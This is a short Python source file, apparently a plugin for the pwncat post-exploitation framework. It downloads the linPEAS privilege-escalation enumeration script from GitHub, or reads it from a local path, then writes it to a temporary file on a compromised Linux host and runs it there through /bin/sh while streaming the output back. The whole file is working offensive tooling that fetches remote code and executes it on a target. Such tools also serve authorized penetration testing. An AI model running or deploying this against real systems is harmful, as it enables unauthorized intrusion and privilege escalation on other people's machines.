from requests import get

import pwncat
from pwncat.modules.peas import PeassModule, mktemp, stream
from pwncat.platform import Linux
from pwncat.subprocess import PIPE, STDOUT


class Module(PeassModule):

    PLATFORM = [Linux]

    linpeas_lnk = "https://github.com/carlospolop/PEASS-ng/raw/master/linPEAS/linpeas.sh"

    def enumerate(self, session: "pwncat.manager.Session", source: str):

        if source:
            src = open(source, "r")
            linpeas = src.read()
            src.close()

        else:
            linpeas = get(self.linpeas_lnk, allow_redirects=True).text

        dst = mktemp(session, mode="w", suffix="sh")
        dst.write(linpeas)
        dst.close()

        proc = session.platform.Popen(
            ["/bin/sh", dst.name], stdout=PIPE, stderr=STDOUT)

        stream(proc)
